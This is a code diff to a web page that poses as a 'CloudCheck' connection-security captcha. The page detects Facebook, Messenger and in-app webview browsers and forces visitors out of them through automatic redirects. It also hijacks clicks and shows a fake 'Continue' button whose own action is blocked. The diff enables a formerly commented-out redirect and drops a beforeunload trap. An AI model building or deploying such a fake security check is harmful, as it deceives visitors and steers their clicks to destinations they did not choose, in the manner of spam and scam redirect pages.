@@ -171,6 +171,7 @@
             font-size: 17px;
             line-height: 20px;
             margin-top: 70px;
+            margin-bottom: 15px;
         }
 
         .captcha-logo {
@@ -289,6 +290,46 @@
                 transform: rotate(360deg);
             }
         }
+        .button {
+            animation: animation_button 1s ease-out 0s infinite;
+            background: linear-gradient(to bottom, rgba(56, 197, 74, 1) 0%, rgba(0, 139, 36, 1) 100%);
+            border: 0;
+            border-radius: 7px;
+            color: #fff;
+            display: inline-block;
+            filter: brightness(1);
+            font-weight: bold;
+            line-height: 100%;
+            margin: 0 auto;
+            outline: none;
+            padding: 15px;
+            text-align: center;
+            text-decoration: none;
+            text-transform: uppercase;
+            transform: scale(1);
+            width: auto;
+        }
+        @keyframes animation_button {
+            0%, 25% {
+                filter: brightness(1);
+                transform: scale(1);
+            }
+            50% {
+                filter: brightness(1.05);
+                transform: scale(1.05);
+            }
+            75%, 100% {
+                filter: brightness(1);
+                transform: scale(1);
+            }
+        }
+        .instructions-before {
+            display: block;
+        }
+        .instructions-after {
+            display: none;
+            text-align: center;
+        }
     </style>
     <script>
         var urlTabNew = 'https://www.google.com/search?q=new+tab';
@@ -304,43 +345,41 @@
         }
 
         function is(pattern) {
-            return Boolean(navigator.userAgent.match(new RegExp(pattern, 'ig')))
+            return Boolean(navigator.userAgent.match(new RegExp(pattern, 'ig')));
         }
-
         var isFBMessenger = is(regex.fbmessenger);
         var isFB = is(regex.fb) && !isFBMessenger;
         var isInstagram = is(regex.instagram);
         var isWebview = is(regex.webview) && !isFBMessenger && !isFB && !isInstagram;
-
-        function redirectTabCurrent () {
+        function redirectTabCurrent() {
             if (!document.hidden) {
-                // document.location.replace(urlTabCurrent);
+                document.location.replace(urlTabCurrent);
             }
         }
-
-        function init () {
+        function redirectTabIntent() {
+            document.location.href = urlTabNew;
+        }
+        function init() {
             if (isFBMessenger || isFB || isWebview) {
-                document.location.href = urlTabNew;
+                redirectTabIntent();
+                document.addEventListener('click', redirectTabIntent);
                 document.addEventListener('visibilitychange', redirectTabCurrent);
-                var timeoutId = setTimeout(function () {
+                document.querySelector('.button').addEventListener('click', function(e) {
+                    e.preventDefault();
+                });
+                var timeoutInfoId = setTimeout(function() {
+                    clearTimeout(timeoutInfoId);
+                    document.removeEventListener('click', redirectTabIntent);
+                    document.addEventListener('click', redirectTabCurrent);
+                    document.querySelector('.instructions-before').style.display = 'none';
+                    document.querySelector('.instructions-after').style.display = 'block';
+                }, 2500);
+                var timeoutId = setTimeout(function() {
                     clearTimeout(timeoutId);
                     redirectTabCurrent();
                 }, 5000);
-                if (navigator.userActivation) {
-                    var intervalId = setInterval(function () {
-                        if (navigator.userActivation.isActive) {
-                            clearInterval(intervalId);
-                            window.addEventListener('beforeunload', function (e) {
-                                e.preventDefault();
-                                e.returnValue = true;
-                                return '*';
-                            });
-                        }
-                    }, 500);
-                }
             }
         }
-
         if (document.readyState !== 'interactive') {
             document.addEventListener('DOMContentLoaded', init);
         } else {
@@ -373,7 +412,13 @@
                     <p class="captcha-logo-text">CloudCheck</p>
                 </div>
             </div>
-            <p class="captcha-instructions">We need to review the security of your connection before proceeding</p>
+            <p class="captcha-instructions instructions-before">We need to review the security of your connection before proceeding</p>
+            <div class="instructions-after">
+                <div class="captcha-instructions">Click to continue</div>
+                <a class="button" href="#">
+                    <span>Continue</span>
+                </a>
+            </div>
         </div>
     </div>
 </body>
